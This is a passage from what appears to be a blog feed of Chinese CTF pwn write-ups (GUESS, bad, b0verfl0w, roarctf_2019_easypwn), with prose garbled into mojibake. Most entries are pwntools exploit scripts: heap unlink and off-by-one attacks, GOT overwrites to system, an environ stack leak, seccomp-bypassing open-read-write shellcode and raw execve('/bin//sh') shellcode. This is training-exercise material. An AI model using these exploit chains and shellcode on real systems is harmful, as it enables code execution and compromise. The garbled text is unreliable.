#nameio.recvuntil(&quot;:&quot;)io.sendline(&quot;ddd&quot;)&#39;&#39;&#39;ptr=0x602120fd=ptr-0x18bk=ptr-0x10payload=b&#39;\x00&#39;*8+p64(0xa1)+p64(fd)+p64(bk)add(0x80,payload)     #0add(0,&#39;sadf&#39;)         #1add(0x80,&#39;bin/sh&#39;)    #2free(1)payload=p64(0)*2+p64(0xa0)+p64(0x90)add(0,payload)free(2)#b&#39;a&#39;*0x18free_got=elf.got[&#39;free&#39;]payload=b&#39;a&#39;*0x18+p64(free_got)edit(0,1,payload)gdb.attach(p)sleep(1)show(0)p.recvuntil(&#39;is &#39;)addr=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))base=addr-libc.sym[&#39;free&#39;]system=base+libc.sym[&#39;system&#39;]one=base+0xf02a4edit(0,1,p64(system))print(hex(addr))#p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_final_5</title>
      <link href="/2024/04/11/ciscn-final-5/"/>
      <url>/2024/04/11/ciscn-final-5/</url>
      
        <content type="html"><![CDATA[<h5 id="æ²¡å¼€åç§»çš„ä¿æŠ¤"><a href="#æ²¡å¼€åç§»çš„ä¿æŠ¤" class="headerlink" title="æ²¡å¼€åç§»çš„ä¿æŠ¤"></a>æ²¡å¼€åç§»çš„ä¿æŠ¤</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411193750286.png" alt="image-20240411193750286"></p><p>åœ°å€è¿›è¡Œæˆ–è¿ç®—åä¿å­˜ï¼Œæœ€åä¸€ä½å­˜index</p><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411193908492.png" alt="image-20240411193908492"></p><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411194425445.png" alt="image-20240411194425445"></p><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411194802328.png" alt="image-20240411194802328"></p><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411195346375.png" alt="image-20240411195346375"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GUESS</title>
      <link href="/2024/03/23/GUESS/"/>
      <url>/2024/03/23/GUESS/</url>
      
        <content type="html"><![CDATA[<p>å¼€äº†canary</p><p><img src="https://i0.imgs.ovh/2024/03/22/gkJhl.png" alt="image-20240323183540854"></p><h5 id="åœ¨è¾“å…¥ä½ç½®å¯¹åº”çš„ç¬¬25ä¸ªå‚æ•°ï¼Œç›¸å·®0x128çš„ä½ç½®ä¸Šæ˜¯mainå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°argc-åé¢æ˜¯ç¬¬ä¸‰ä¸ªenvpå‚æ•°"><a href="#åœ¨è¾“å…¥ä½ç½®å¯¹åº”çš„ç¬¬25ä¸ªå‚æ•°ï¼Œç›¸å·®0x128çš„ä½ç½®ä¸Šæ˜¯mainå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°argc-åé¢æ˜¯ç¬¬ä¸‰ä¸ªenvpå‚æ•°" class="headerlink" title="åœ¨è¾“å…¥ä½ç½®å¯¹åº”çš„ç¬¬25ä¸ªå‚æ•°ï¼Œç›¸å·®0x128çš„ä½ç½®ä¸Šæ˜¯mainå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°argc,åé¢æ˜¯ç¬¬ä¸‰ä¸ªenvpå‚æ•°"></a>åœ¨è¾“å…¥ä½ç½®å¯¹åº”çš„ç¬¬25ä¸ªå‚æ•°ï¼Œç›¸å·®0x128çš„ä½ç½®ä¸Šæ˜¯mainå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°argc,åé¢æ˜¯ç¬¬ä¸‰ä¸ªenvpå‚æ•°</h5><p><img src="https://i0.imgs.ovh/2024/03/22/gsrOt.png" alt="image-20240323211819577"></p><h5 id="æŠŠargcçš„ä½ç½®è¦†ç›–æˆputs-got-æ³„éœ²åç§»ï¼Œç®—å‡ºenviron-base-libc-sym-â€˜-environâ€™-è¿™ä¸ªå­˜ç€æ ˆä¸Šçš„åœ°å€ï¼Œå³0x7ffdfb3b9728è¿™ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€å­˜ç€ç¯å¢ƒå˜é‡ï¼Œå†è¦†ç›–argcä¸ºenvironï¼Œæ‰“å°å‡ºæ ˆåœ°å€ï¼Œå†ç®—åç§»"><a href="#æŠŠargcçš„ä½ç½®è¦†ç›–æˆputs-got-æ³„éœ²åç§»ï¼Œç®—å‡ºenviron-base-libc-sym-â€˜-environâ€™-è¿™ä¸ªå­˜ç€æ ˆä¸Šçš„åœ°å€ï¼Œå³0x7ffdfb3b9728è¿™ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€å­˜ç€ç¯å¢ƒå˜é‡ï¼Œå†è¦†ç›–argcä¸ºenvironï¼Œæ‰“å°å‡ºæ ˆåœ°å€ï¼Œå†ç®—åç§»" class="headerlink" title="æŠŠargcçš„ä½ç½®è¦†ç›–æˆputs_got,æ³„éœ²åç§»ï¼Œç®—å‡ºenviron=base+libc.sym[â€˜__environâ€™],è¿™ä¸ªå­˜ç€æ ˆä¸Šçš„åœ°å€ï¼Œå³0x7ffdfb3b9728è¿™ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€å­˜ç€ç¯å¢ƒå˜é‡ï¼Œå†è¦†ç›–argcä¸ºenvironï¼Œæ‰“å°å‡ºæ ˆåœ°å€ï¼Œå†ç®—åç§»"></a>æŠŠargcçš„ä½ç½®è¦†ç›–æˆputs_got,æ³„éœ²åç§»ï¼Œç®—å‡ºenviron=base+libc.sym[â€˜__environâ€™],è¿™ä¸ªå­˜ç€æ ˆä¸Šçš„åœ°å€ï¼Œå³0x7ffdfb3b9728è¿™ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€å­˜ç€ç¯å¢ƒå˜é‡ï¼Œå†è¦†ç›–argcä¸ºenvironï¼Œæ‰“å°å‡ºæ ˆåœ°å€ï¼Œå†ç®—åç§»</h5><h5 id="æœ¬åœ°ä¸€ç›´æ‰“ä¸é€šï¼Œè°ƒè¯•ä¹Ÿæœ‰é—®é¢˜"><a href="#æœ¬åœ°ä¸€ç›´æ‰“ä¸é€šï¼Œè°ƒè¯•ä¹Ÿæœ‰é—®é¢˜" class="headerlink" title="æœ¬åœ°ä¸€ç›´æ‰“ä¸é€šï¼Œè°ƒè¯•ä¹Ÿæœ‰é—®é¢˜"></a>æœ¬åœ°ä¸€ç›´æ‰“ä¸é€šï¼Œè°ƒè¯•ä¹Ÿæœ‰é—®é¢˜</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node5.buuoj.cn&quot;,26222)p=process(&quot;./GUESS&quot;)context.log_level=&quot;debug&quot;elf=ELF(&#39;./GUESS&#39;)puts_got=elf.got[&#39;puts&#39;]libc=ELF(&#39;./libc-2.23.so&#39;)payload=b&#39;a&#39;*0x128+p64(puts_got)p.recvuntil(&#39; guessing flag&#39;)p.sendline(payload)p.recvuntil(&#39;detected ***: &#39;)puts_addr=u64(p.recvuntil(&#39;\x7f&#39;).ljust(8,b&#39;\x00&#39;))print(hex(puts_addr))base=puts_addr-libc.sym[&#39;puts&#39;]environ=base+libc.sym[&#39;__environ&#39;]payload=b&#39;a&#39;*0x128+p64(environ)gdb.attach(p)p.recvuntil(&#39; guessing flag&#39;)p.sendline(payload)p.recvuntil(&#39;detected ***: &#39;)envi=u64(p.recvuntil(&#39;\x7f&#39;).ljust(8,b&#39;\x00&#39;))print(hex(envi))flag=envi-0x168payload=b&#39;a&#39;*0x128+p64(flag)p.recvuntil(&#39; guessing flag&#39;)p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bad</title>
      <link href="/2024/03/22/bad/"/>
      <url>/2024/03/22/bad/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/21/eN68l.png" alt="image-20240322140930289"></p><p><img src="https://i0.imgs.ovh/2024/03/21/eNkFd.png" alt="image-20240322141022925"></p><p><img src="https://i0.imgs.ovh/2024/03/21/eN0sK.png" alt="image-20240322141035709"></p><h5 id="å¾ˆæ˜æ˜¾åœ°ç”¨shellcodeå†™ï¼Œä¸è¿‡ä¸èƒ½ç”¨ä¸€èˆ¬çš„shellcodeæ¥å†™-å¹³æ—¶çš„shellcodeæ˜¯ç”¨é€šè¿‡ç³»ç»Ÿè°ƒç”¨exceve-â€˜bin-shâ€™-0-0-æ­£å¦‚è¿™é“é¢˜ï¼Œseccompæ˜¯Linuxå†…æ ¸çš„ä¸€é¡¹åŠŸèƒ½ï¼Œç”¨äºé™åˆ¶è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨"><a href="#å¾ˆæ˜æ˜¾åœ°ç”¨shellcodeå†™ï¼Œä¸è¿‡ä¸èƒ½ç”¨ä¸€èˆ¬çš„shellcodeæ¥å†™-å¹³æ—¶çš„shellcodeæ˜¯ç”¨é€šè¿‡ç³»ç»Ÿè°ƒç”¨exceve-â€˜bin-shâ€™-0-0-æ­£å¦‚è¿™é“é¢˜ï¼Œseccompæ˜¯Linuxå†…æ ¸çš„ä¸€é¡¹åŠŸèƒ½ï¼Œç”¨äºé™åˆ¶è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="å¾ˆæ˜æ˜¾åœ°ç”¨shellcodeå†™ï¼Œä¸è¿‡ä¸èƒ½ç”¨ä¸€èˆ¬çš„shellcodeæ¥å†™,å¹³æ—¶çš„shellcodeæ˜¯ç”¨é€šè¿‡ç³»ç»Ÿè°ƒç”¨exceve(â€˜bin/shâ€™,0,0),æ­£å¦‚è¿™é“é¢˜ï¼Œseccompæ˜¯Linuxå†…æ ¸çš„ä¸€é¡¹åŠŸèƒ½ï¼Œç”¨äºé™åˆ¶è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨"></a>å¾ˆæ˜æ˜¾åœ°ç”¨shellcodeå†™ï¼Œä¸è¿‡ä¸èƒ½ç”¨ä¸€èˆ¬çš„shellcodeæ¥å†™,å¹³æ—¶çš„shellcodeæ˜¯ç”¨é€šè¿‡ç³»ç»Ÿè°ƒç”¨exceve(â€˜bin/shâ€™,0,0),æ­£å¦‚è¿™é“é¢˜ï¼Œseccompæ˜¯Linuxå†…æ ¸çš„ä¸€é¡¹åŠŸèƒ½ï¼Œç”¨äºé™åˆ¶è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨</h5><h5 id="seccomp-init-0LL-æ˜¯åˆå§‹åŒ–seccomp-initå‡½æ•°"><a href="#seccomp-init-0LL-æ˜¯åˆå§‹åŒ–seccomp-initå‡½æ•°" class="headerlink" title="seccomp_init(0LL);æ˜¯åˆå§‹åŒ–seccomp_initå‡½æ•°"></a><strong><em>seccomp_init(0LL);</em></strong>æ˜¯åˆå§‹åŒ–seccomp_initå‡½æ•°</h5><h5 id="0ï¼Œ1ï¼Œ2ï¼Œ60ï¼Œåˆ†åˆ«æ˜¯å…è®¸è¿›ç¨‹å¯è¯»ï¼Œå¯å†™ï¼Œå¯æ‰§è¡Œï¼Œå’Œé€€å‡ºçš„ç³»ç»Ÿè°ƒç”¨"><a href="#0ï¼Œ1ï¼Œ2ï¼Œ60ï¼Œåˆ†åˆ«æ˜¯å…è®¸è¿›ç¨‹å¯è¯»ï¼Œå¯å†™ï¼Œå¯æ‰§è¡Œï¼Œå’Œé€€å‡ºçš„ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="0ï¼Œ1ï¼Œ2ï¼Œ60ï¼Œåˆ†åˆ«æ˜¯å…è®¸è¿›ç¨‹å¯è¯»ï¼Œå¯å†™ï¼Œå¯æ‰§è¡Œï¼Œå’Œé€€å‡ºçš„ç³»ç»Ÿè°ƒç”¨"></a><strong><em>0ï¼Œ1ï¼Œ2ï¼Œ60</em></strong>ï¼Œåˆ†åˆ«æ˜¯å…è®¸è¿›ç¨‹å¯è¯»ï¼Œå¯å†™ï¼Œå¯æ‰§è¡Œï¼Œå’Œé€€å‡ºçš„ç³»ç»Ÿè°ƒç”¨</h5><p><img src="https://i0.imgs.ovh/2024/03/21/eNBi2.png" alt="image-20240322141910159"></p><h5 id="æ‰€ä»¥è¿™é“é¢˜åªèƒ½ç”¨orwçš„æ–¹å¼è·å–flag"><a href="#æ‰€ä»¥è¿™é“é¢˜åªèƒ½ç”¨orwçš„æ–¹å¼è·å–flag" class="headerlink" title="æ‰€ä»¥è¿™é“é¢˜åªèƒ½ç”¨orwçš„æ–¹å¼è·å–flag"></a>æ‰€ä»¥è¿™é“é¢˜åªèƒ½ç”¨orwçš„æ–¹å¼è·å–flag</h5><pre><code class="lang-py">mmap=0x123000orw_payload=shellcraft.open(&#39;./flag&#39;) #æ‰“å¼€æ ¹ç›®å½•ä¸‹çš„flagæ–‡ä»¶ï¼Œæ–‡ä»¶æ ‡è¯†ç¬¦ä¸º3orw_payload+=shellcraft.read(3,mmap,0x50) #è¯»å–æ–‡ä»¶æ ‡è¯†ç¬¦ä¸º3çš„æ–‡ä»¶çš„0x50ä¸ªå­—èŠ‚åˆ°åœ°å€mmaporw_payload+=shellcraft.write(1,mmap,0x50) #å°†mmapçš„åœ°å€çš„å€¼è¾“å‡º</code></pre><h5 id="ä¸æŠŠorw-payloadå†™åˆ°æ ˆä¸Šå› ä¸ºå…¶å¾ˆå¤§"><a href="#ä¸æŠŠorw-payloadå†™åˆ°æ ˆä¸Šå› ä¸ºå…¶å¾ˆå¤§" class="headerlink" title="ä¸æŠŠorw_payloadå†™åˆ°æ ˆä¸Šå› ä¸ºå…¶å¾ˆå¤§"></a>ä¸æŠŠorw_payloadå†™åˆ°æ ˆä¸Šå› ä¸ºå…¶å¾ˆå¤§</h5><p><img src="https://i0.imgs.ovh/2024/03/21/eaafo.png" alt="image-20240322151355993"></p><h5 id="æ‰€ä»¥åªèƒ½å†™åˆ°mmapåœ°å€ä¸Šï¼Œè¿”å›åœ°å€è®©å…¶æ‰§è¡Œåˆ°æ ˆä¸Šè¯»å…¥orw-payloadåˆ°mmapä¸Š"><a href="#æ‰€ä»¥åªèƒ½å†™åˆ°mmapåœ°å€ä¸Šï¼Œè¿”å›åœ°å€è®©å…¶æ‰§è¡Œåˆ°æ ˆä¸Šè¯»å…¥orw-payloadåˆ°mmapä¸Š" class="headerlink" title="æ‰€ä»¥åªèƒ½å†™åˆ°mmapåœ°å€ä¸Šï¼Œè¿”å›åœ°å€è®©å…¶æ‰§è¡Œåˆ°æ ˆä¸Šè¯»å…¥orw-payloadåˆ°mmapä¸Š"></a>æ‰€ä»¥åªèƒ½å†™åˆ°mmapåœ°å€ä¸Šï¼Œè¿”å›åœ°å€è®©å…¶æ‰§è¡Œåˆ°æ ˆä¸Šè¯»å…¥orw-payloadåˆ°mmapä¸Š</h5><p><img src="https://i0.imgs.ovh/2024/03/21/ea9JH.png" alt="image-20240322151126619"></p><pre><code class="lang-py">jmp_rsp_ret=asm(&#39;sub rsp,0x30;jmp rsp&#39;)get_shell=asm(&#39;mov rax,0x123000;call rax&#39;)payload=asm(shellcraft.read(0,mmap,0x100))+get_shellpayload=payload.ljust(0x28,b&#39;\x00&#39;)payload+=p64(jmp_rsp)+jmp_rsp_ret#</code></pre><h5 id="å®è·µè¯æ˜ï¼Œè¿”å›åœ°å€ä¸èƒ½ç›´æ¥sub-rsp-0x30-jmp-rsp-å¾—å…ˆjmp-esp-ä¸ç„¶ä¼šæŠ¥é”™ï¼Œä½†æˆ‘è§‰å¾—æœ€ç»ˆçš„ç»“æœéƒ½å·®ä¸å¤šï¼Œä½†æ˜¯ä¸è¡Œã€‚"><a href="#å®è·µè¯æ˜ï¼Œè¿”å›åœ°å€ä¸èƒ½ç›´æ¥sub-rsp-0x30-jmp-rsp-å¾—å…ˆjmp-esp-ä¸ç„¶ä¼šæŠ¥é”™ï¼Œä½†æˆ‘è§‰å¾—æœ€ç»ˆçš„ç»“æœéƒ½å·®ä¸å¤šï¼Œä½†æ˜¯ä¸è¡Œã€‚" class="headerlink" title="å®è·µè¯æ˜ï¼Œè¿”å›åœ°å€ä¸èƒ½ç›´æ¥sub rsp,0x30;jmp rsp,å¾—å…ˆjmp esp,ä¸ç„¶ä¼šæŠ¥é”™ï¼Œä½†æˆ‘è§‰å¾—æœ€ç»ˆçš„ç»“æœéƒ½å·®ä¸å¤šï¼Œä½†æ˜¯ä¸è¡Œã€‚"></a>å®è·µè¯æ˜ï¼Œè¿”å›åœ°å€ä¸èƒ½ç›´æ¥sub rsp,0x30;jmp rsp,å¾—å…ˆjmp esp,ä¸ç„¶ä¼šæŠ¥é”™ï¼Œä½†æˆ‘è§‰å¾—æœ€ç»ˆçš„ç»“æœéƒ½å·®ä¸å¤šï¼Œä½†æ˜¯ä¸è¡Œã€‚</h5><h5 id="æœ€åå†å†™å…¥orw-payloadå°±è¡Œäº†"><a href="#æœ€åå†å†™å…¥orw-payloadå°±è¡Œäº†" class="headerlink" title="æœ€åå†å†™å…¥orw_payloadå°±è¡Œäº†"></a>æœ€åå†å†™å…¥orw_payloadå°±è¡Œäº†</h5><pre><code class="lang-py">p.sendline(asm(orw_payload))</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>b0verfl0w</title>
      <link href="/2024/03/20/b0verfl0w/"/>
      <url>/2024/03/20/b0verfl0w/</url>
      
        <content type="html"><![CDATA[<pre><code class="lang-py">; æ±‡ç¼–æŒ‡ä»¤xor ecx, ecx          ; å°† ecx å¯„å­˜å™¨æ¸…é›¶mul ecx               ; å°† eax å¯„å­˜å™¨ä¸­çš„å€¼ä¸ ecx å¯„å­˜å™¨ä¸­çš„å€¼ç›¸ä¹˜ï¼Œç»“æœå­˜æ”¾åœ¨ eax å’Œ edx ä¸­ï¼Œç›¸å½“äº edx = eax * 0push ecx              ; å°† ecx å¯„å­˜å™¨ä¸­çš„å€¼å‹å…¥æ ˆï¼Œæ­¤æ—¶æ ˆé¡¶ä¸º 0push 0x68732f2f       ; å°†å­—ç¬¦ä¸² &quot;/bin//sh&quot; çš„ ASCII ç é€†åºå‹å…¥æ ˆpush 0x6e69622f       ; ç»§ç»­å°†å­—ç¬¦ä¸² &quot;/bin//sh&quot; çš„ ASCII ç é€†åºå‹å…¥æ ˆmov ebx, esp          ; å°† esp å¯„å­˜å™¨ä¸­çš„å€¼ï¼ˆå³å­—ç¬¦ä¸² &quot;/bin//sh&quot; çš„åœ°å€ï¼‰å­˜æ”¾åˆ° ebx å¯„å­˜å™¨ä¸­mov al, 0xb           ; å°† 0xb å­˜æ”¾åˆ° al å¯„å­˜å™¨ä¸­ï¼Œè¯¥å€¼ä»£è¡¨ execve ç³»ç»Ÿè°ƒç”¨çš„ç¼–å·int 0x80              ; è§¦å‘ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰§è¡Œ execve(&quot;/bin//sh&quot;, NULL, NULL)</code></pre><pre><code class="lang-py">shellcode=b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;+b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;+b&quot;\x0b\xcd\x80&quot;</code></pre><p><img src="https://i0.imgs.ovh/2024/03/19/eJhTA.png" alt="image-20240320230854571"></p><h5 id="ret2shellcode-ä½†æ˜¯å¤§å°ä¸å¤Ÿäº†"><a href="#ret2shellcode-ä½†æ˜¯å¤§å°ä¸å¤Ÿäº†" class="headerlink" title="ret2shellcode,ä½†æ˜¯å¤§å°ä¸å¤Ÿäº†"></a>ret2shellcode,ä½†æ˜¯å¤§å°ä¸å¤Ÿäº†</h5><p><img src="https://i0.imgs.ovh/2024/03/19/eJKbs.png" alt="image-20240320231042503"></p><pre><code class="lang-py">sub_esp_jmp=asm(&quot;sub esp,0x28;jmp esp&quot;)</code></pre><h5 id="æ”¹å†™å…¶ä»–ä¸è¡Œ"><a href="#æ”¹å†™å…¶ä»–ä¸è¡Œ" class="headerlink" title="æ”¹å†™å…¶ä»–ä¸è¡Œ"></a>æ”¹å†™å…¶ä»–ä¸è¡Œ</h5><h5 id="è¿”å›åœ°å€æ‰§è¡Œåˆ°jmp-esp-ç„¶åesp-4ï¼Œæ‰§è¡Œsub-esp-0x28-jmp-espï¼Œå¯ä»¥è·³åˆ°shellcodeçš„åœ°å€"><a href="#è¿”å›åœ°å€æ‰§è¡Œåˆ°jmp-esp-ç„¶åesp-4ï¼Œæ‰§è¡Œsub-esp-0x28-jmp-espï¼Œå¯ä»¥è·³åˆ°shellcodeçš„åœ°å€" class="headerlink" title="è¿”å›åœ°å€æ‰§è¡Œåˆ°jmp_esp,ç„¶åesp+4ï¼Œæ‰§è¡Œsub esp,0x28;jmp espï¼Œå¯ä»¥è·³åˆ°shellcodeçš„åœ°å€"></a>è¿”å›åœ°å€æ‰§è¡Œåˆ°jmp_esp,ç„¶åesp+4ï¼Œæ‰§è¡Œsub esp,0x28;jmp espï¼Œå¯ä»¥è·³åˆ°shellcodeçš„åœ°å€</h5><pre><code class="lang-py">payload=asm(shellcode)+b&#39;a&#39;*(0x20-len(shellcode))+b&#39;aaaa&#39;+p32(jmp_esp)+sup_esp_jmp</code></pre><p><img src="https://i0.imgs.ovh/2024/03/19/eJ8qV.png" alt="image-20240320234818524"></p><p><img src="https://i0.imgs.ovh/2024/03/19/eJEnJ.png" alt="image-20240320234859035"></p><p><img src="https://i0.imgs.ovh/2024/03/19/eJToW.png" alt="image-20240320234951277"></p><h5 id="jmp-espçš„æ“ä½œï¼ŒæŠŠæ ˆé¡¶è®¾ä¸ºesp-åŒæ—¶eipæŒ‡å‘æ ˆé¡¶"><a href="#jmp-espçš„æ“ä½œï¼ŒæŠŠæ ˆé¡¶è®¾ä¸ºesp-åŒæ—¶eipæŒ‡å‘æ ˆé¡¶" class="headerlink" title="jmp espçš„æ“ä½œï¼ŒæŠŠæ ˆé¡¶è®¾ä¸ºesp,åŒæ—¶eipæŒ‡å‘æ ˆé¡¶"></a>jmp espçš„æ“ä½œï¼ŒæŠŠæ ˆé¡¶è®¾ä¸ºesp,åŒæ—¶eipæŒ‡å‘æ ˆé¡¶</h5><p><img src="https://i0.imgs.ovh/2024/03/20/eimXu.png" alt="image-20240321125420592"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node5.buuoj.cn&quot;,28594)p=process(&quot;./b0verfl0w&quot;)context.log_level=&quot;debug&quot;context.arch=&#39;i386&#39;shellcode=b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;+b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;+b&quot;\x0b\xcd\x80&quot;print(len(shellcode))#gdb.attach(p)sleep(1)jmp_esp=0x08048504sub_esp_jmp=asm(&quot;sub esp,0x28;jmp esp&quot;)payload=shellcode+b&#39;a&#39;*(0x20-len(shellcode))+b&#39;aaaa&#39;+p32(jmp_esp)+sub_esp_jmp#p.sendline(payload)p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>roarctf_2019_easypwn</title>
      <link href="/2024/03/18/roarctf-2019-easy-pwn/"/>
      <url>/2024/03/18/roarctf-2019-easy-pwn/</url>
      
        <content type="html"><![CDATA[<p> ä¿æŠ¤å…¨å¼€</p><p>editå‡½æ•°</p><p><img src="https://i0.imgs.ovh/2024/03/19/e7kas.png" alt="image-20240320152622842"></p><p>è‹¥è¦ç¼–è¾‘çš„å¤§å°å¤§è¿‡ç”³è¯·çš„10ï¼Œå¯ä»¥å¤šè¾“å…¥ä¸€å­—èŠ‚ï¼Œå­˜åœ¨off-by-oneæ¼æ´</p><p><img src="https://i0.imgs.ovh/2024/03/19/e7IOU.png" alt="image-20240320153710315"></p><h4 id="è¿™é‡Œä¸å¤ªæ‡‚ä¸ºä»€ä¹ˆä¼ªé€ çš„å †1-freeä¸ä¼šæŠ¥é”™"><a href="#è¿™é‡Œä¸å¤ªæ‡‚ä¸ºä»€ä¹ˆä¼ªé€ çš„å †1-freeä¸ä¼šæŠ¥é”™" class="headerlink" title="è¿™é‡Œä¸å¤ªæ‡‚ä¸ºä»€ä¹ˆä¼ªé€ çš„å †1 freeä¸ä¼šæŠ¥é”™"></a>è¿™é‡Œä¸å¤ªæ‡‚ä¸ºä»€ä¹ˆä¼ªé€ çš„å †1 freeä¸ä¼šæŠ¥é”™</h4><p><img src="https://i0.imgs.ovh/2024/03/19/e7wKH.png" alt="image-20240319203609474"></p><pre><code class="lang-py">free(1)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/19/e7pZO.png" alt="image-20240319204503356"></p><pre><code class="lang-py">add(0x90)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/19/e7HD9.png" alt="image-20240319204909619"></p><p>è¯•ç”¨è¿™ç§æ–¹æ³•ä¹Ÿèƒ½showå‡ºmain_arena</p><p><img src="https://i0.imgs.ovh/2024/03/19/e7nO3.png" alt="image-20240319205416560"></p><p><img src="https://i0.imgs.ovh/2024/03/19/e7lwe.png" alt="image-20240319211634694"></p><h4 id="è‡³äºä¸ºä»€ä¹ˆèƒ½showï¼Œä¹Ÿæ˜¯æŒºå¥‡æ€ªçš„ï¼Œå› ä¸ºåœ¨showå‡½æ•°é‚£é‡Œé™åˆ¶äº†å¤§å°ï¼Œå–çš„æ˜¯åŸæ¥çš„å¤§å°"><a href="#è‡³äºä¸ºä»€ä¹ˆèƒ½showï¼Œä¹Ÿæ˜¯æŒºå¥‡æ€ªçš„ï¼Œå› ä¸ºåœ¨showå‡½æ•°é‚£é‡Œé™åˆ¶äº†å¤§å°ï¼Œå–çš„æ˜¯åŸæ¥çš„å¤§å°" class="headerlink" title="è‡³äºä¸ºä»€ä¹ˆèƒ½showï¼Œä¹Ÿæ˜¯æŒºå¥‡æ€ªçš„ï¼Œå› ä¸ºåœ¨showå‡½æ•°é‚£é‡Œé™åˆ¶äº†å¤§å°ï¼Œå–çš„æ˜¯åŸæ¥çš„å¤§å°"></a>è‡³äºä¸ºä»€ä¹ˆèƒ½showï¼Œä¹Ÿæ˜¯æŒºå¥‡æ€ªçš„ï¼Œå› ä¸ºåœ¨showå‡½æ•°é‚£é‡Œé™åˆ¶äº†å¤§å°ï¼Œå–çš„æ˜¯åŸæ¥çš„å¤§å°</h4><p><img src="https://i0.imgs.ovh/2024/03/18/eKiYo.png" alt="image-20240319233028210"></p><pre><code class="lang-py">add(0x80)</code></pre><h5 id="å¥‡æ€ªï¼Œè¿™é‡Œå†ç”³è¯·0x80çš„å¤§å°ï¼Œç„¶åsizeè¿˜æ˜¯0xa1"><a href="#å¥‡æ€ªï¼Œè¿™é‡Œå†ç”³è¯·0x80çš„å¤§å°ï¼Œç„¶åsizeè¿˜æ˜¯0xa1" class="headerlink" title="å¥‡æ€ªï¼Œè¿™é‡Œå†ç”³è¯·0x80çš„å¤§å°ï¼Œç„¶åsizeè¿˜æ˜¯0xa1"></a>å¥‡æ€ªï¼Œè¿™é‡Œå†ç”³è¯·0x80çš„å¤§å°ï¼Œç„¶åsizeè¿˜æ˜¯0xa1</h5><p><img src="https://i0.imgs.ovh/2024/03/19/e73jD.png" alt="image-20240319213208476"></p><p><img src="https://i0.imgs.ovh/2024/03/19/e7mLo.png" alt="image-20240319214042015"></p><h5 id="è¿™é‡Œä¹Ÿä¸å¤ªæ‡‚ä¸ºä»€ä¹ˆè¦è¿™æ ·å†™-åé¢çš„p64-0x70-p64-0x21"><a href="#è¿™é‡Œä¹Ÿä¸å¤ªæ‡‚ä¸ºä»€ä¹ˆè¦è¿™æ ·å†™-åé¢çš„p64-0x70-p64-0x21" class="headerlink" title="è¿™é‡Œä¹Ÿä¸å¤ªæ‡‚ä¸ºä»€ä¹ˆè¦è¿™æ ·å†™,åé¢çš„p64(0x70)+p64(0x21)"></a>è¿™é‡Œä¹Ÿä¸å¤ªæ‡‚ä¸ºä»€ä¹ˆè¦è¿™æ ·å†™,åé¢çš„p64(0x70)+p64(0x21)</h5><pre><code class="lang-py">payload=p64(0)*3+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/19/e760A.png" alt="image-20240319214344529"></p><p><img src="https://i0.imgs.ovh/2024/03/19/e7Wt5.png" alt="image-20240319214501997"></p><h5 id="ä¸è¿‡æœ€åçš„è¯ï¼Œæ˜¯æ‰“ä¸é€šçš„ã€‚"><a href="#ä¸è¿‡æœ€åçš„è¯ï¼Œæ˜¯æ‰“ä¸é€šçš„ã€‚" class="headerlink" title="ä¸è¿‡æœ€åçš„è¯ï¼Œæ˜¯æ‰“ä¸é€šçš„ã€‚"></a>ä¸è¿‡æœ€åçš„è¯ï¼Œæ˜¯æ‰“ä¸é€šçš„ã€‚</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import *r=remote(&#39;node5.buuoj.cn&#39;,28118)#r=process(&#39;roarctf_2019_easy_pwn&#39;)libc=ELF(&#39;./libc-2.23.so&#39;)context.log_level=&quot;debug&quot;def add(size):    r.recvuntil(&#39;choice: &#39;)    r.sendline(&#39;1&#39;)    r.recvuntil(&#39;size:&#39;)    r.sendline(str(size))def edit(index,size,data):    r.recvuntil(&#39;choice: &#39;)    r.sendline(&#39;2&#39;)    r.recvuntil(&#39;index:&#39;)    r.sendline(str(index))    r.recvuntil(&#39;size:&#39;)    r.sendline(str(size))    r.recvuntil(&#39;content:&#39;)    r.send(data)def free(index):    